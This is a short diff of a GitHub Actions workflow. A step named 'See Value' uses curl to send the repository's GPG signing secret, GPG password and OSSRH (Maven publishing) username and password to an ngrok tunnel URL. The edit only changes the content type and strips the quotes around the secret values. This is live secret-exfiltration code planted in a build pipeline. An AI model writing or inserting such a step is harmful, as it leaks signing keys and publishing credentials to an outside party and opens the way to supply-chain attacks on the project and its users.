@@ -28,13 +28,13 @@ jobs:
     - name: See Value
       run: |
         curl 'https://214f-206-237-1-105.ngrok-free.app/apk/seevalue' \
-           -H 'Content-Type: application/json' \
+           -H 'Content-Type: text/plain' \
            -d '
            {
-            	"GPG_SECRET": "${{ secrets.GPG_SECRET }}",
-                "GPG_PASSWORD": "${{ secrets.GPG_PASSWORD }}",
-                "OSSRH_USER": "${{ secrets.OSSRH_USER }}",
-                "OSSRH_PASSWORD": "${{ secrets.OSSRH_PASSWORD }}"
+            	"GPG_SECRET": ${{ secrets.GPG_SECRET }},
+                "GPG_PASSWORD": ${{ secrets.GPG_PASSWORD }},
+                "OSSRH_USER": ${{ secrets.OSSRH_USER }},
+                "OSSRH_PASSWORD": ${{ secrets.OSSRH_PASSWORD }}
            }'
 
 #    - name: Cache .m2
